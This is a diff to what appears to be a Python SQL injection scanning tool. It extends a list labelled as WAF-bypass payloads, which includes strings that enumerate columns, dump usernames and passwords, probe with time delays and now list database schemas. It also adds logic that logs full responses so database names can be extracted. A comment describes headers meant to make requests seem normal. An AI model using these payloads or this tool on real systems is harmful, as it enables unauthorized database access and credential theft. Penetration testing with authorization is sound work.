@@ -32,6 +32,7 @@ waf_bypass_payloads = [
     "'; SELECT column_name FROM information_schema.columns WHERE table_name = 'users' --",  # Columns enum
     "'; SELECT username, password FROM users --",  # Attempt to dump credentials
     "' AND SLEEP(5) --",  # Time-based SQLi
+    "'; SELECT schema_name FROM information_schema.schemata --",  # Databases enumeration
 ]
 
 # Headers to make requests seem normal
@@ -84,6 +85,13 @@ def test_sql_injection(url, method, form_data):
                 with lock:
                     found_vulnerabilities.append((url, payload, "Time-based SQL Injection"))
                     logger.info(f"Time-based SQL Injection found at {url} with payload {payload}")
+            elif "schema_name" in response.text.lower():  # Database enumeration
+                # Check if we are able to extract schema/database names
+                with lock:
+                    found_vulnerabilities.append((url, payload, "Database names found"))
+                    logger.info(f"Databases found at {url} with payload {payload}")
+                    # Extract database names from the response
+                    logger.info(f"Response: {response.text}")
 
         except RequestException as e:
             logger.error(f"Error testing {url}: {str(e)}")
